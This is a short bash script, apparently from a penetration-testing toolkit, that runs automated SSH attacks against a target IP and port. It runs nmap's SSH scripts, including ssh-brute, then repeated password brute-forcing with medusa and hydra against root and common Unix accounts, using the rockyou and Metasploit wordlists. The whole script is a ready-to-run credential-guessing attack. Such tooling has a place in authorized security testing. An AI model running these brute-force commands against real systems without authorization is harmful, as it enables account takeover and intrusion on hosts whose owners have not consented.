#!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+---_-----------------------------------------------+"
echo -e "|  Adversarial Informatics Combat SSH Enumeration   |"
echo -e "|             cygienesolutions.com                  |"
echo -e "|     [Usage]: ./ssh_aic_enum.sh <TARGET> <PORT>    |"
echo -e "+---------------------------------------------------+"
echo -e "${NC}"
if [ $# == 0 ] ; then
    exit 1; fi

IP="$1"
PORT="$2"
SCRIPTPATH=`dirname $(realpath $0)`
mkdir ./$IP
echo $SCRIPTPATH

echo -e "${GREEN}"
echo -e "Running standard nmap ssh enumeration..."
echo -e "${NC}"
# Running standard nmap ssh enumeration
nmap -n -vv -Pn -sV $IP -p $PORT --script=ssh2-enum-algos.nse,ssh-auth-methods.nse,ssh-brute.nse,ssh-hostkey.nse,ssh-publickey-acceptance.nse,ssh-run.nse,sshv1.nse -oA $IP/ssh_enum_$IP-$PORT

echo -e "${GREEN}"
echo -e "Running medusa with user root and rockyou.txt..."
echo -e "${NC}"
# Running medusa with user root and rockyou.txt
medusa -u root -P /usr/share/wordlists/rockyou.txt -e ns -h $IP - $PORT -M ssh -f


echo -e "${GREEN}"
echo -e "Running medusa with common unix_users and unix_passwords..."
echo -e "${NC}"
# RUnning medusa with common unix_users and unix_passwords
medusa -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -e ns -h $IP - $PORT -M ssh -f


echo -e "${GREEN}"
echo -e "Running hydra with root and rockyou.txt..."
echo -e "${NC}"
# Running hydra with root and rockyou.txt
hydra -f -V -t 1 -l root -P /usr/share/wordlists/rockyou.txt -s $PORT $IP ssh

